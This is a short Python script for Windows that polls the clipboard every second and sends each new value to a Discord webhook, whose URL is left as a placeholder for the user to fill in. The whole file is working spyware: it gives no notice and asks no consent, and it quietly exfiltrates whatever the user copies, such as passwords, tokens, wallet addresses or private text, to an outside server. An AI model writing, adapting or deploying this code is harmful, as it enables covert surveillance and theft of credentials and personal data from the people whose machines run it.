import time
import win32clipboard
import requests
import json

# Replace <YOUR_DISCORD_WEBHOOK_URL> with the actual webhook URL
DISCORD_WEBHOOK_URL = '<YOUR_DISCORD_WEBHOOK_URL>'

def send_discord_message(message):
    """
    Sends a message to a Discord server using a webhook.
    """
    payload = {
        'embeds': [{
            'title': 'Clipboard Data',
            'description': message
        }]
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    if response.status_code != 204:
        print('Failed to send message to Discord server')
    else:
        print('Message sent successfully')

while True:
    win32clipboard.OpenClipboard()
    clipboard_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    # Check if clipboard data has changed since last check
    try:
        if clipboard_data != last_clipboard_data:
            print(f'Clipboard data changed: {clipboard_data}')
            send_discord_message(clipboard_data)
    except NameError:
        print(f'Clipboard data changed: {clipboard_data}')
        send_discord_message(clipboard_data)

    last_clipboard_data = clipboard_data
    time.sleep(1) # Check clipboard every second
